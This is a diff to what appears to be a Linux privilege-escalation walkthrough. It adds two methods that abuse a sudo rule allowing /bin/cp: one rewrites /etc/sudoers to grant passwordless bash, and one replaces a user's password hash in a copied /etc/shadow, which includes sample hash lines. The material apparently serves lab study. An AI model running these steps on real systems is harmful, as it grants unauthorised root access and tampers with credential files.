@@ -422,7 +422,11 @@ cp: Missing Operands
 
 [franky@ubuntu]$ pwd
 > /home/franky
+```
 
+Method 1 - Patch /etc/sudoers
+
+```
 [franky@ubuntu]$ touch sudoers_Im_Coming
 [franky@ubuntu]$ sudo cp /etc/sudoers ~/sudoers_Im_Coming
 [franky@ubuntu]$ ls -l sudoers*
@@ -440,6 +444,26 @@ franky	...				:NOPASSWORD	/bin/cp # Change /bin/cp to /bin/bash
 
 :wq
 ```
+
+
+Method 2 - Patch /etc/shadow
+
+```
+[franky@ubuntu]$ touch my_shadow
+[franky@ubuntu]$ sudo cp /etc/shadow ~/my_shadow
+[franky@ubuntu]$ ls -l *shadow
+> rwxr-xr-x franky franky my_shadow
+[franky@ubuntu]$ vi my_shadow
+```
+
+ViM screen, Replace the hash of tester by franky's hash
+
+```
+tester:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtKeWUIR0IMbKzIcY8OIOfOVFhE0:17954:0:99999:7:::
+franky:$6$5r7X8q0p$8/mDvW4mkkuXNwmGU78TlE1n3JXf1hHNZwKbZlDjdchRGE.7cRb/IwwclWQtKeWUIR0IMbKzIcY8OIOfOVFhE0:17949:0:99999:7:::
+```
+
+I'm root !!!
 
 ```
 [franky@ubuntu]$ sudo -s 
